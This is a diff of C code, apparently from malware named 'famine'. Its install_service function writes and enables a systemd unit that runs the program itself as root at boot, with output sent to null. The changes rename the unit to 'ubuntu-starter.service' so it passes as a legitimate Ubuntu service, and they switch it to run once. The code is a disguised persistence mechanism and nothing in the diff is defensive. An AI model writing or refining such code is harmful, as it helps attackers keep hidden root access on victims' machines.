@@ -8,7 +8,7 @@ static int get_executable_path(char *buf, size_t size) {
 }
 
 static void install_service() {
-    const char *service_path = "/etc/systemd/system/famine.service";
+    const char *service_path = "/etc/systemd/system/ubuntu-starter.service";
     struct stat st;
     if (stat(service_path, &st) == 0) {
         return;
@@ -31,9 +31,10 @@ static void install_service() {
         "Description=Ubuntu auto-run service\n"
         "After=network.target\n\n"
         "[Service]\n"
-        "Type=simple\n"
+        "Type=oneshot\n"
+        "RemainAfterExit=yes\n"
         "ExecStart=%s\n"
-        "Restart=on-failure\n"
+        "Restart=no\n"
         "User=root\n"
         "WorkingDirectory=%s\n"
         "StandardOutput=null\n"
@@ -53,8 +54,8 @@ static void install_service() {
     close(fd);
 
     system("systemctl daemon-reload");
-    system("systemctl enable famine.service");
-    system("systemctl start famine.service");
+    system("systemctl enable ubuntu-starter.service");
+    system("systemctl start ubuntu-starter.service");
 }
 
 void setup_boot_start() {
